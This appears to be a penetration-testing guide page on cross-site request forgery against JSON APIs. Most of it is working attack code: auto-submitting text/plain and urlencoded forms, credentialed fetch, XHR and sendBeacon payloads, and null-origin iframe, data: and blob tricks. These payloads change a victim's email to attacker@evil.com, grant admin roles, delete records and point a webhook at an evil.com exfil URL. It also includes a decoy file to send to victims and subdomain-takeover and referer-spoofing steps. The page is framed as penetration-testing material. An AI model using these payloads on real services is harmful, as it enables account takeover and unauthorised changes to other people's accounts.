---
title: CSRF in JSON Endpoints Attack & Techniques
description: Advanced exploitation techniques for Cross-Site Request Forgery targeting JSON-based API endpoints, content-type bypasses, SameSite evasion, token manipulation, and modern framework abuse for penetration testers.
navigation:
  icon: i-lucide-shield-alert
  title: CSRF in JSON Endpoints
---

## Understanding JSON CSRF Attack Surface

::note
Traditional CSRF defenses assume JSON `Content-Type: application/json` requests trigger CORS preflight checks, making cross-origin forgery impossible. This assumption fails when servers accept alternative content types, lack proper token validation, or misconfigure CORS policies. JSON CSRF exploitation targets these gaps to forge authenticated state-changing API requests from attacker-controlled pages.
::

::card-group
  ::card
  ---
  title: Content-Type Smuggling
  icon: i-lucide-file-json
  ---
  Bypass preflight CORS restrictions by delivering JSON payloads through `text/plain`, `application/x-www-form-urlencoded`, or `multipart/form-data` content types that browsers treat as "simple" requests.
  ::

  ::card
  ---
  title: SameSite Cookie Evasion
  icon: i-lucide-cookie
  ---
  Defeat `SameSite=Lax` defaults using top-level navigation, popup windows, method override abuse, the 2-minute chrome Lax+POST window, and WebSocket hijacking.
  ::

  ::card
  ---
  title: Token Manipulation
  icon: i-lucide-key-round
  ---
  Exploit weak CSRF token implementations through removal, reuse, cross-user swapping, type juggling, empty values, predictable generation, and double-submit cookie injection.
  ::

  ::card
  ---
  title: Origin & Referer Forgery
  icon: i-lucide-globe
  ---
  Circumvent server-side origin validation using null origins via sandboxed iframes, data URIs, subdomain confusion, port manipulation, and referrer policy suppression.
  ::

  ::card
  ---
  title: Framework Parser Abuse
  icon: i-lucide-server
  ---
  Target lenient body parsers in Express, Django, Flask, Spring, ASP.NET, FastAPI, and Rails that auto-negotiate content types or accept JSON from non-JSON content types.
  ::

  ::card
  ---
  title: Protocol-Level Attacks
  icon: i-lucide-network
  ---
  Leverage HTTP 307/308 redirects preserving method and body, WebSocket CSRF, GraphQL mutation forgery, JSON-RPC batch attacks, and Flash-based content-type spoofing on legacy targets.
  ::
::

## Reconnaissance & Target Identification

### Discovering JSON API Endpoints

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Burp Suite Discovery"}
  ```bash
  # Step 1: Crawl target with authenticated session
  # Burp Suite → Target → Site map → Right-click → Scan → Crawl

  # Step 2: Filter proxy history for JSON state-changing requests
  # Proxy → HTTP History → Filter settings:
  #   MIME type: JSON
  #   Method: POST, PUT, PATCH, DELETE
  #   Status: 2xx, 3xx

  # Step 3: Search for state-changing patterns in request bodies
  # Ctrl+F in HTTP History search:
  #   "email"
  #   "password"
  #   "role"
  #   "admin"
  #   "transfer"
  #   "amount"
  #   "delete"
  #   "update"
  #   "webhook"

  # Step 4: Export interesting endpoints
  # Right-click filtered results → Copy URLs → Save to file

  # Step 5: Check each endpoint for CSRF protections
  # Send to Repeater → Remove CSRF headers/tokens → Replay
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ffuf Enumeration"}
  ```bash
  # Discover API endpoints with common patterns
  ffuf -u https://target.com/api/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID_SESSION" \
    -X POST -d '{}' \
    -mc 200,201,204,301,302,400,401,403,405,422 \
    -o api_endpoints.json -of json

  # Version-specific API enumeration
  for version in v1 v2 v3; do
    ffuf -u "https://target.com/api/${version}/FUZZ" \
      -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt \
      -X POST -H "Content-Type: application/json" \
      -H "Cookie: session=VALID_SESSION" \
      -d '{"test":"probe"}' \
      -mc 200,201,204,400,422 \
      -o "api_${version}.json" -of json
  done

  # Discover nested resource endpoints
  ffuf -u https://target.com/api/v1/users/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt \
    -X POST -H "Content-Type: application/json" \
    -H "Cookie: session=VALID_SESSION" \
    -d '{}' \
    -mc 200,201,204,400,422

  # GraphQL endpoint discovery
  ffuf -u https://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
    -X POST -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}' \
    -mc 200
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="nuclei Scanning"}
  ```bash
  # Scan for CSRF vulnerabilities using nuclei templates
  nuclei -u https://target.com -t csrf/ -v

  # Custom nuclei template for JSON CSRF detection
  cat > json-csrf-detect.yaml << 'EOF'
  id: json-csrf-no-token
  info:
    name: JSON Endpoint Missing CSRF Protection
    severity: high
    tags: csrf,json,api
  
  http:
    - raw:
        - |
          POST {{BaseURL}}/api/user/update HTTP/1.1
          Host: {{Hostname}}
          Content-Type: text/plain
          Origin: https://evil.com
          Cookie: session={{session}}

          {"email":"csrf-test@probe.com"}
      
      matchers-condition: and
      matchers:
        - type: status
          status:
            - 200
            - 201
            - 204
        - type: word
          words:
            - "success"
            - "updated"
            - "email"
          condition: or
  EOF

  nuclei -u https://target.com -t json-csrf-detect.yaml \
    -var session=VALID_SESSION -v
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="httpx Probing"}
  ```bash
  # Mass probe endpoints for content-type acceptance
  cat endpoints.txt | httpx -method POST \
    -H "Content-Type: text/plain" \
    -body '{"probe":"csrf"}' \
    -mc 200,201,204 \
    -title -status-code -content-length \
    -o text_plain_accepted.txt

  # Compare responses between content types
  cat endpoints.txt | httpx -method POST \
    -H "Content-Type: application/json" \
    -body '{"probe":"csrf"}' \
    -mc 200,201,204 \
    -content-length \
    -o json_responses.txt

  # Check for missing security headers
  cat endpoints.txt | httpx -method OPTIONS \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: POST" \
    -match-string "Access-Control-Allow-Origin" \
    -o cors_misconfigured.txt
  ```
  :::
::

### CSRF Protection Fingerprinting

::accordion
  :::accordion-item{icon="i-lucide-shield" label="CSRF Token Detection"}
  ```bash
  # Check response headers for CSRF tokens
  curl -sI https://target.com/api/profile | grep -iE "csrf|xsrf|token|x-request"

  # Check cookies for CSRF-related values
  curl -sI https://target.com/ | grep -iE "set-cookie.*(csrf|xsrf|_token|antiforgery)"

  # Check if X-CSRF-Token header is validated
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"name":"test"}' -v 2>&1 | grep -iE "csrf|forbidden|invalid|missing.*token"

  # Check HTML meta tags for CSRF tokens
  curl -s https://target.com/ | grep -iE 'meta.*(csrf|xsrf|token)'

  # Check JavaScript files for CSRF token retrieval patterns
  curl -s https://target.com/static/app.js | grep -iE "csrf|xsrf|X-CSRF|_token"

  # Check if token is in response body (JSON)
  curl -s https://target.com/api/session \
    -H "Cookie: session=VALID" | jq '.csrf_token // .xsrf_token // ._token // .token'

  # Check hidden form fields
  curl -s https://target.com/settings | grep -iE 'input.*csrf|input.*token|input.*_token'
  ```
  :::

  :::accordion-item{icon="i-lucide-shield" label="SameSite Cookie Analysis"}
  ```bash
  # Full cookie attribute inspection
  curl -sI https://target.com/login -X POST \
    -d "user=test&pass=test" 2>&1 | grep -i "set-cookie"

  # Parse SameSite values from all cookies
  curl -sI https://target.com/ | \
    grep -i "set-cookie" | \
    while read -r line; do
      cookie_name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
      samesite=$(echo "$line" | grep -ioP 'samesite=\K\w+' || echo "NOT SET (defaults to Lax)")
      secure=$(echo "$line" | grep -qi "secure" && echo "Yes" || echo "No")
      httponly=$(echo "$line" | grep -qi "httponly" && echo "Yes" || echo "No")
      echo "Cookie: $cookie_name | SameSite: $samesite | Secure: $secure | HttpOnly: $httponly"
    done

  # Interpretation:
  # SameSite=Strict → CSRF very difficult, need same-site XSS
  # SameSite=Lax → POST CSRF blocked, GET method override possible
  # SameSite=None; Secure → Full cross-site CSRF possible (HTTPS only)
  # Not Set → Chrome/Edge default to Lax, Firefox/Safari may vary
  ```
  :::

  :::accordion-item{icon="i-lucide-shield" label="CORS Policy Enumeration"}
  ```bash
  # Preflight test with attacker origin
  curl -X OPTIONS https://target.com/api/update \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: Content-Type" \
    -v 2>&1 | grep -i "access-control"

  # Test null origin
  curl -X OPTIONS https://target.com/api/update \
    -H "Origin: null" \
    -H "Access-Control-Request-Method: POST" \
    -v 2>&1 | grep -i "access-control"

  # Test subdomain patterns
  for origin in \
    "https://evil.target.com" \
    "https://target.com.evil.com" \
    "https://targetcom.evil.com" \
    "https://sub.target.com" \
    "https://anything.sub.target.com" \
    "http://target.com" \
    "https://target.com:8443" \
    "https://target.com:443"; do
    echo -n "Origin: $origin → "
    curl -s -o /dev/null -w "%{http_code}" \
      -X OPTIONS "https://target.com/api/update" \
      -H "Origin: $origin" \
      -H "Access-Control-Request-Method: POST"
    echo ""
  done

  # Check for wildcard with credentials
  curl -X OPTIONS https://target.com/api/update \
    -H "Origin: https://randomsite.com" \
    -v 2>&1 | grep -E "Allow-Origin|Allow-Credentials"
  # If Allow-Origin: * AND Allow-Credentials: true → Critical misconfiguration
  ```
  :::

  :::accordion-item{icon="i-lucide-shield" label="Referer Validation Testing"}
  ```bash
  # Test 1: No Referer header at all
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"test@probe.com"}' -v

  # Test 2: Empty Referer
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Referer: " \
    -H "Cookie: session=VALID" \
    -d '{"email":"test@probe.com"}'

  # Test 3: Referer domain confusion patterns
  REFERER_PAYLOADS=(
    "https://target.com.evil.com"
    "https://evil.com/target.com"
    "https://evil.com/?ref=https://target.com"
    "https://evil.com/page#target.com"
    "https://targetcom.evil.com"
    "https://evil-target.com"
    "https://target.com@evil.com"
    "https://evil.com%23target.com"
    "https://evil.com%2F%2Ftarget.com"
    "https://target.com.evil.com/path"
    "http://target.com"
  )

  for ref in "${REFERER_PAYLOADS[@]}"; do
    echo -n "Referer: $ref → "
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST "https://target.com/api/update" \
      -H "Content-Type: application/json" \
      -H "Referer: $ref" \
      -H "Cookie: session=VALID" \
      -d '{"email":"test@probe.com"}'
    echo ""
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-shield" label="Custom Header Requirement Detection"}
  ```bash
  # Some APIs require custom headers like X-Requested-With
  # Custom headers trigger preflight → blocks simple CSRF

  # Test without X-Requested-With
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"test@probe.com"}' -v

  # Test with X-Requested-With
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Cookie: session=VALID" \
    -d '{"email":"test@probe.com"}' -v

  # Compare responses - if both succeed, custom header not enforced
  # Other custom headers to test removal:
  # X-Api-Key, Authorization (Bearer), X-Custom-Auth
  ```
  :::
::

## Content-Type Bypass Techniques

::warning
The fundamental vector for JSON CSRF exploitation is content-type manipulation. Browsers only enforce CORS preflight for certain content types. If a server parses JSON from a non-preflight content type, CSRF becomes possible without any CORS misconfiguration.
::

### Simple Request Content Types (No Preflight)

::note
According to the CORS specification, these three content types are classified as "simple" and do **not** trigger preflight OPTIONS requests. This is the core of JSON CSRF exploitation.
::

| Content-Type | Preflight | Browser Form Support | Fetch no-cors | CSRF Vector |
| --- | --- | --- | --- | --- |
| `text/plain` | **No** | `enctype="text/plain"` | ✅ | **Primary** |
| `application/x-www-form-urlencoded` | **No** | Default `enctype` | ✅ | **Secondary** |
| `multipart/form-data` | **No** | `enctype="multipart/form-data"` | ✅ | **Tertiary** |
| `application/json` | **Yes** | ❌ | ❌ (cors mode) | Blocked by preflight |
| `application/xml` | **Yes** | ❌ | ❌ | Blocked by preflight |
| `text/xml` | **No** | ❌ | ✅ | Limited |
| `application/json; charset=utf-8` | **Yes** | ❌ | ❌ | Blocked by preflight |
| `application/vnd.api+json` | **Yes** | ❌ | ❌ | Blocked by preflight |
| `application/csp-report` | **Yes** | ❌ | ❌ | Blocked by preflight |
| `application/x-json` | **Yes** | ❌ | ❌ | Blocked by preflight |

### HTML Form text/plain Technique

::tip
The `text/plain` form technique is the most reliable JSON CSRF vector. The browser concatenates `name=value` pairs and sends them as the request body. By placing JSON in the `name` attribute and handling the `=` sign, you craft valid JSON payloads.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Basic text/plain"}
  ```html
  <!-- Browser sends: {"email":"attacker@evil.com","pad":"="}  -->
  <!-- The = sign is injected between name and value by the browser -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
    <input type="hidden" name='{"email":"attacker@evil.com","pad":"' value='"}' />
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Nested JSON Objects"}
  ```html
  <!-- Sends: {"user":{"email":"attacker@evil.com","role":"admin"},"pad":"="} -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <form action="https://target.com/api/user/update" method="POST" enctype="text/plain">
    <input type="hidden"
      name='{"user":{"email":"attacker@evil.com","role":"admin"},"pad":"'
      value='"}' />
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Arrays in JSON"}
  ```html
  <!-- Sends: {"ids":[1,2,3],"action":"delete","pad":"="} -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <form action="https://target.com/api/bulk/delete" method="POST" enctype="text/plain">
    <input type="hidden"
      name='{"ids":[1,2,3],"action":"delete","pad":"'
      value='"}' />
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Integer & Boolean Values"}
  ```html
  <!-- Sends: {"is_admin":true,"level":99,"amount":10000,"pad":"="} -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <form action="https://target.com/api/user/role" method="POST" enctype="text/plain">
    <input type="hidden"
      name='{"is_admin":true,"level":99,"amount":10000,"pad":"'
      value='"}' />
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Equals Sign Elimination"}
  ```html
  <!-- Some servers reject the trailing = in values -->
  <!-- Technique: Place = inside a JSON string value that gets ignored -->

  <!-- Method A: Use value field to close JSON cleanly -->
  <!-- Sends: {"email":"attacker@evil.com","_":"=x"} -->
  <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","_":"' value='x"}' type="hidden">
  </form>

  <!-- Method B: Array body (trailing = outside JSON) -->
  <!-- Sends: [{"email":"attacker@evil.com"}]= -->
  <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
    <input name='[{"email":"attacker@evil.com"}]' value="" type="hidden">
  </form>

  <!-- Method C: Multiple input fields -->
  <!-- Sends: {"email":"attacker@evil.com"}\r\npadding= -->
  <!-- Only works if server ignores content after first JSON object -->
  <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com"}' value="" type="hidden">
  </form>
  ```
  :::
::

### URL-Encoded JSON Smuggling

::tabs
  :::tabs-item{icon="i-lucide-code" label="Direct JSON in Body"}
  ```html
  <!-- application/x-www-form-urlencoded with JSON string -->
  <!-- Some servers parse the raw body as JSON regardless of content-type -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <form action="https://target.com/api/user/email" method="POST">
    <!-- Default enctype is application/x-www-form-urlencoded -->
    <input type="hidden" name='{"email":"attacker@evil.com"}' value="" />
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  <!-- Body sent: %7B%22email%22%3A%22attacker%40evil.com%22%7D= -->
  <!-- URL-decoded by some parsers back to JSON -->
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Parameter Pollution to JSON"}
  ```html
  <!-- Abuse parameter-to-JSON conversion in some frameworks -->
  <!-- express body-parser or qs library converts: -->
  <!-- user[email]=attacker@evil.com → {"user":{"email":"attacker@evil.com"}} -->
  <html>
  <body>
  <form action="https://target.com/api/user/update" method="POST">
    <input type="hidden" name="user[email]" value="attacker@evil.com" />
    <input type="hidden" name="user[role]" value="admin" />
    <input type="hidden" name="user[is_admin]" value="true" />
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Bracket Notation Abuse"}
  ```html
  <!-- Deep nested object construction via URL parameters -->
  <!-- Rails strong parameters / Express qs parsing -->
  <html>
  <body>
  <form action="https://target.com/api/settings" method="POST">
    <input name="settings[notifications][email]" value="attacker@evil.com" type="hidden">
    <input name="settings[security][two_factor]" value="false" type="hidden">
    <input name="settings[profile][role]" value="administrator" type="hidden">
    <input name="settings[api][webhook_url]" value="https://evil.com/exfil" type="hidden">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::
::

### Multipart Form Data Exploitation

::code-collapse
```html
<!-- Multipart form data can sometimes be parsed as JSON by the server -->

<!-- Technique 1: JSON payload in multipart field -->
<html>
<body>
<form action="https://target.com/api/user/email" method="POST"
      enctype="multipart/form-data">
  <input type="hidden" name="json" value='{"email":"attacker@evil.com"}' />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

<!-- Technique 2: File upload with JSON content -->
<html>
<body>
<form action="https://target.com/api/import" method="POST"
      enctype="multipart/form-data">
  <input type="file" name="data" id="fileInput" style="display:none">
</form>
<script>
// Create a file with JSON content
const jsonContent = JSON.stringify({email: "attacker@evil.com"});
const blob = new Blob([jsonContent], {type: 'application/json'});
const file = new File([blob], 'data.json', {type: 'application/json'});

const dt = new DataTransfer();
dt.items.add(file);
document.getElementById('fileInput').files = dt.files;
document.forms[0].submit();
</script>
</body>
</html>

<!-- Technique 3: Multipart with Content-Type boundary manipulation -->
<html>
<body>
<script>
const boundary = '----FormBoundary' + Math.random().toString(36);
const body = `--${boundary}\r\nContent-Disposition: form-data; name="data"\r\nContent-Type: application/json\r\n\r\n{"email":"attacker@evil.com"}\r\n--${boundary}--`;

fetch('https://target.com/api/user/email', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  headers: {
    'Content-Type': `multipart/form-data; boundary=${boundary}`
  },
  body: body
});
</script>
</body>
</html>
```
::

### Fetch API & XHR Exploitation

::tabs
  :::tabs-item{icon="i-lucide-code" label="Fetch no-cors Mode"}
  ```html
  <html>
  <body>
  <script>
  // fetch() with mode: 'no-cors' sends request without preflight
  // Only simple headers allowed (text/plain, urlencoded, multipart)
  // Cookies included with credentials: 'include'

  // Vector 1: text/plain with JSON body
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'text/plain'
    },
    body: JSON.stringify({
      email: 'attacker@evil.com'
    })
  });

  // Vector 2: URL-encoded with JSON body
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: '{"email":"attacker@evil.com"}'
  });

  // Vector 3: No Content-Type header at all
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    body: '{"email":"attacker@evil.com"}'
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Navigator sendBeacon"}
  ```html
  <html>
  <body>
  <script>
  // sendBeacon() always sends POST with credentials
  // Cannot read response (fire-and-forget)
  // Survives page unload

  // Blob with text/plain type (no preflight)
  const blob = new Blob(
    [JSON.stringify({ email: 'attacker@evil.com' })],
    { type: 'text/plain' }
  );
  navigator.sendBeacon('https://target.com/api/user/email', blob);

  // URLSearchParams (sends as application/x-www-form-urlencoded)
  const params = new URLSearchParams();
  params.append('{"email":"attacker@evil.com"}', '');
  navigator.sendBeacon('https://target.com/api/user/email', params);

  // FormData (sends as multipart/form-data)
  const fd = new FormData();
  fd.append('data', '{"email":"attacker@evil.com"}');
  navigator.sendBeacon('https://target.com/api/user/email', fd);

  // Plain string (sends as text/plain)
  navigator.sendBeacon(
    'https://target.com/api/user/email',
    '{"email":"attacker@evil.com"}'
  );
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="XMLHttpRequest Variants"}
  ```html
  <html>
  <body>
  <script>
  // XHR with text/plain (no preflight triggered)
  var xhr1 = new XMLHttpRequest();
  xhr1.open('POST', 'https://target.com/api/user/email', true);
  xhr1.setRequestHeader('Content-Type', 'text/plain');
  xhr1.withCredentials = true;
  xhr1.send('{"email":"attacker@evil.com"}');

  // XHR with application/x-www-form-urlencoded
  var xhr2 = new XMLHttpRequest();
  xhr2.open('POST', 'https://target.com/api/user/email', true);
  xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr2.withCredentials = true;
  xhr2.send('{"email":"attacker@evil.com"}');

  // XHR with charset manipulation (may bypass some filters)
  var xhr3 = new XMLHttpRequest();
  xhr3.open('POST', 'https://target.com/api/user/email', true);
  xhr3.setRequestHeader('Content-Type', 'text/plain; charset=UTF-8');
  xhr3.withCredentials = true;
  xhr3.send('{"email":"attacker@evil.com"}');

  // XHR with multipart/form-data
  var xhr4 = new XMLHttpRequest();
  xhr4.open('POST', 'https://target.com/api/user/email', true);
  xhr4.setRequestHeader('Content-Type', 'multipart/form-data; boundary=----x');
  xhr4.withCredentials = true;
  xhr4.send('------x\r\nContent-Disposition: form-data; name="d"\r\n\r\n{"email":"attacker@evil.com"}\r\n------x--');
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Image/Script Tag Abuse"}
  ```html
  <!-- GET-based JSON CSRF via various HTML elements -->
  <!-- Works when target accepts GET for state-changing operations -->

  <!-- Image tag -->
  <img src="https://target.com/api/user/email?email=attacker@evil.com&_method=POST" style="display:none">

  <!-- Script tag -->
  <script src="https://target.com/api/user/email?email=attacker@evil.com&_method=POST"></script>

  <!-- Link prefetch -->
  <link rel="prefetch" href="https://target.com/api/user/email?email=attacker@evil.com">

  <!-- CSS import -->
  <style>
  @import url('https://target.com/api/user/email?email=attacker@evil.com&_method=POST');
  </style>

  <!-- Video/Audio tag -->
  <video src="https://target.com/api/delete-account?confirm=true" style="display:none"></video>

  <!-- Favicon -->
  <link rel="icon" href="https://target.com/api/settings?notifications=off">

  <!-- Object/Embed tag -->
  <object data="https://target.com/api/user/update?role=admin" style="display:none"></object>

  <!-- Background image in inline style -->
  <div style="background-image:url('https://target.com/api/action?do=malicious')"></div>
  ```
  :::
::

## Origin & Referer Bypass Techniques

### Null Origin Injection

::tabs
  :::tabs-item{icon="i-lucide-code" label="Sandboxed iframe"}
  ```html
  <!-- iframe sandbox attribute forces Origin: null -->
  <!-- allow-scripts: enables JavaScript execution -->
  <!-- allow-forms: enables form submission -->
  <!-- NOT including allow-same-origin forces null origin -->

  <html>
  <body>
  <iframe sandbox="allow-scripts allow-forms" srcdoc="
  <html><body>
  <form action='https://target.com/api/user/email' method='POST' enctype='text/plain'>
    <input name='{&quot;email&quot;:&quot;attacker@evil.com&quot;,&quot;p&quot;:&quot;' 
           value='&quot;}' type='hidden'>
  </form>
  <script>document.forms[0].submit();</script>
  </body></html>
  "></iframe>
  </body>
  </html>

  <!-- HTTP Request sent:
  POST /api/user/email HTTP/1.1
  Host: target.com
  Origin: null
  Content-Type: text/plain
  Cookie: session=VICTIM_SESSION
  
  {"email":"attacker@evil.com","p":"="} -->
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="data: URI Scheme"}
  ```html
  <!-- data: URIs send Origin: null -->
  <html>
  <body>
  <iframe src="data:text/html;base64,PGh0bWw+PGJvZHk+CjxzY3JpcHQ+CmZldGNoKCdodHRwczovL3RhcmdldC5jb20vYXBpL3VzZXIvZW1haWwnLCB7CiAgbWV0aG9kOiAnUE9TVCcsCiAgbW9kZTogJ25vLWNvcnMnLAogIGNyZWRlbnRpYWxzOiAnaW5jbHVkZScsCiAgaGVhZGVyczogeyAnQ29udGVudC1UeXBlJzogJ3RleHQvcGxhaW4nIH0sCiAgYm9keTogJ3siZW1haWwiOiJhdHRhY2tlckBldmlsLmNvbSJ9Jwp9KTsKPC9zY3JpcHQ+CjwvYm9keT48L2h0bWw+">
  </iframe>
  </body>
  </html>

  <!-- Base64 decoded content:
  <html><body>
  <script>
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: '{"email":"attacker@evil.com"}'
  });
  </script>
  </body></html> -->
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Blob URL"}
  ```html
  <html>
  <body>
  <script>
  // blob: URLs also send Origin: null in some browsers
  const html = `
  <html><body><script>
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
  <\/script></body></html>`;
  
  const blob = new Blob([html], { type: 'text/html' });
  const url = URL.createObjectURL(blob);
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = url;
  document.body.appendChild(iframe);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="file:// Protocol"}
  ```html
  <!-- If victim opens HTML file locally (file:// protocol) -->
  <!-- Origin is null for local files -->

  <!-- Save as: exploit.html and send to victim -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <h1>Important Document - Please Review</h1>
  <p>Loading content...</p>
  <script>
  // Origin: null when opened from filesystem
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: '{"email":"attacker@evil.com"}'
  });
  </script>
  </body>
  </html>
  ```
  :::
::

### Referer Manipulation

::code-group
```html [Suppress Referer Entirely]
<!-- Method 1: Referrer-Policy meta tag -->
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
<form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

<!-- Method 2: Referrer-Policy on link/form -->
<a href="https://target.com/api/action?method=POST&email=attacker@evil.com"
   referrerpolicy="no-referrer">Click here</a>

<!-- Method 3: rel=noreferrer -->
<a href="https://target.com/page" rel="noreferrer">Click</a>

<!-- Method 4: Referrer-Policy in iframe -->
<iframe src="exploit.html" referrerpolicy="no-referrer"></iframe>

<!-- Method 5: Fetch with referrerPolicy -->
<script>
fetch('https://target.com/api/user/email', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  referrerPolicy: 'no-referrer',
  headers: { 'Content-Type': 'text/plain' },
  body: '{"email":"attacker@evil.com"}'
});
</script>
```

```bash [Referer Domain Confusion]
# Register domains that confuse referer validation

# Pattern 1: Target domain as subdomain
# Register: target.com.evil.com
# Referer: https://target.com.evil.com/page

# Pattern 2: Target domain in path
# Host at: https://evil.com/target.com/exploit.html
# Referer: https://evil.com/target.com/exploit.html

# Pattern 3: Target domain as parameter
# Host at: https://evil.com/?origin=target.com
# Referer: https://evil.com/?origin=target.com

# Pattern 4: Target domain as fragment
# Referer typically excludes fragments
# Host at: https://evil.com/page#target.com

# Pattern 5: Target domain in username
# https://target.com@evil.com/exploit.html
# Referer: https://target.com@evil.com/exploit.html

# Pattern 6: Punycode/IDN confusion
# Register: tаrget.com (Cyrillic 'а' U+0430)
# visually identical to target.com

# Pattern 7: URL-encoded confusion
# https://evil.com/%74arget.com
# Some validators decode before checking

# Pattern 8: Double-URL-encoded
# https://evil.com/%2574arget.com

# Testing all patterns:
PATTERNS=(
  "https://target.com.evil.com/page"
  "https://evil.com/target.com/page"
  "https://evil.com/?r=target.com"
  "https://evil.com/page?ref=https://target.com"
  "https://target.com@evil.com/page"
  "https://evil-target.com/page"
  "https://targett.com/page"
  "http://target.com/page"
)

for ref in "${PATTERNS[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/update" \
    -H "Content-Type: text/plain" \
    -H "Referer: $ref" \
    -H "Cookie: session=VALID" \
    -d '{"email":"test@probe.com"}')
  echo "Referer: $ref → $status"
done
```
::

### Subdomain-Based Origin Bypass

::code-collapse
```bash
# If the server validates Origin against *.target.com
# Find and exploit vulnerable subdomains

# Step 1: Enumerate subdomains
subfinder -d target.com -silent | tee subdomains.txt
amass enum -passive -d target.com | tee -a subdomains.txt
sort -u subdomains.txt -o subdomains.txt

# Step 2: Check for subdomain takeover
subjack -w subdomains.txt -t 50 -timeout 30 -ssl \
  -c /usr/share/subjack/fingerprints.json -v

nuclei -l subdomains.txt -t takeovers/ -v

# Step 3: Check for XSS on subdomains (for Origin bypass)
cat subdomains.txt | httpx -silent | nuclei -t xss/ -v

# Step 4: Check for open redirect on subdomains
cat subdomains.txt | httpx -silent | \
  while read url; do
    curl -s -o /dev/null -w "%{redirect_url}" \
      "${url}/redirect?url=https://evil.com" 2>/dev/null
  done

# Step 5: If subdomain has XSS, use it for JSON CSRF
# XSS on blog.target.com → Origin: https://blog.target.com
# This passes *.target.com origin validation

# Step 6: Host CSRF payload via subdomain takeover
# Claimed subdomain: old-app.target.com
# Origin: https://old-app.target.com passes validation

# Step 7: Alternative - subdomain cookie injection
# If you control any subdomain, set cookies for .target.com
# document.cookie = "csrf_token=controlled; domain=.target.com; path=/"
# This breaks double-submit cookie CSRF protection
```
::

